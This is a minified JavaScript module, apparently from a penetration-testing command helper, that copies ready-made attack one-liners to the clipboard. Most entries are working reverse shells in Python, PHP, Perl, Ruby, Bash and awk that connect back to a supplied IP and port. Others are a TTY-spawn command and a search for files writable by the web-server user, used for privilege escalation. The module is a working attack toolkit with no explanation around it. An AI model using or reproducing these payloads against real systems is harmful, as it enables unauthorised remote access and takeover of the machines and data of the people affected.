"use strict";var _interopRequireDefault=require("@babel/runtime/helpers/interopRequireDefault");Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _asyncToGenerator2=_interopRequireDefault(require("@babel/runtime/helpers/asyncToGenerator")),_clipboardy=_interopRequireDefault(require("clipboardy")),_default={/* eslint-disable max-len */"reverse shell (python)":[{text:"Copy Python reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${a}",${b}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (php)":[{text:"Copy PHP reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`php -r '$sock=fsockopen("${a}",${b});exec("/bin/sh -i <&3 >&3 2>&3");'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (perl)":[{text:"Copy Perl reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`perl -e 'use Socket;$i="${a}";$p=${b};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (ruby)":[{text:"Copy Ruby reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`ruby -rsocket -e'f=TCPSocket.open("${a}",${b}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (bash)":[{text:"Copy Bash reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`bash -i >& /dev/tcp/${a}/${b} 0>&1`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (awk)":[{text:"Copy awk reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`awk 'BEGIN {s = "/inet/tcp/0/${a}/${b}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"spawn a TTY shell (linux)":[{text:"Copy command to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*(){yield _clipboardy.default.write("python -c 'import pty;pty.spawn(\"/bin/bash\")")});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"find files/folders with write access (linux)":[{text:"Copy command to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*(){yield _clipboardy.default.write("find / -path /proc -prune -o '(' -type f -or -type d ')' '(' '(' -user  www-data -perm -u=w ')' -or '(' -group www-data -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2> /dev/null")});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}]};exports.default=_default;